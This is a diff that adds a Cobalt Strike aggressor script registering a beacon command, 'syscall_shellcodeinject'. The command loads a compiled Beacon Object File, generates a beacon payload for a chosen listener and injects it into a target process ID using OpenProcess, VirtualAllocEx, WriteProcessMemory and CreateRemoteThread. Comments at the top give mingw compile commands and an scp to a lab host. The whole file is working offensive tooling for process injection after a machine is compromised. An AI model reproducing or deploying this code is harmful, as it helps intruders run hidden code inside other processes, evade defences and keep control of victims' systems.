@@ -1,0 +1,50 @@
+# $1 = beacon ID
+# $2 = pid
+# scp * 192.168.122.130:/root/BeaconObjectFile/syscall_shellcodeinject
+# x86_64-w64-mingw32-gcc -c syscall_shellcodeinject.c -o syscall_shellcodeinject.x64.o -masm=intel
+# i686-w64-mingw32-gcc -c syscall_shellcodeinject.c -o syscall_shellcodeinject.x86.o -masm=intel
+# x86_64-w64-mingw32-gcc -c syscall_shellcodeinject.c -o syscall_shellcodeinject.o -masm=intel
+
+
+alias syscall_shellcodeinject {
+	local('$bid $handle $data $pid $listener $payload');
+
+	# check our arguments
+	if (size(@_) != 3) {
+		berror($1, "syscall_shellcodeinject: not enough arguments. Enter the PID and Listener");
+		return;
+	}
+
+	# parse our arguments
+	$pid	= $2;
+	$listener = $3;
+
+	# Verify PID is a number
+	if ((!-isnumber $pid) || (int($pid) <= 0))
+	{
+		berror($1, "syscall_shellcodeinject: enter a valid PID");
+		return;
+	}
+
+	# read in our BOF file...
+	$handle = openf(script_resource("syscall_shellcodeinject.o"));
+	$data	= readb($handle, -1);
+	closef($handle);
+
+    	# Generate a new payload 
+    	$payload = payload("Test", "x64", "thread");
+	$handle2 = openf(">out.bin");
+	writeb($handle2, $payload);
+	closef($handle2);
+   
+	# pack our arguments
+	$args	= bof_pack($1, "ib", $pid, $payload);
+
+	# announce to our user..
+	btask($1, "Injecting into PID $2");
+
+	# run a BOF
+	beacon_inline_execute($1, $data, "go", $args);
+}
+beacon_command_register("syscall_shellcodeinject", "Basic PE shellcode injection method via syscalls", "Synopsis: syscall_shellcodeinject [pid] \n\nBasic OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread\nWin32APIs in a beacon object file to inject into a target PID.");
+
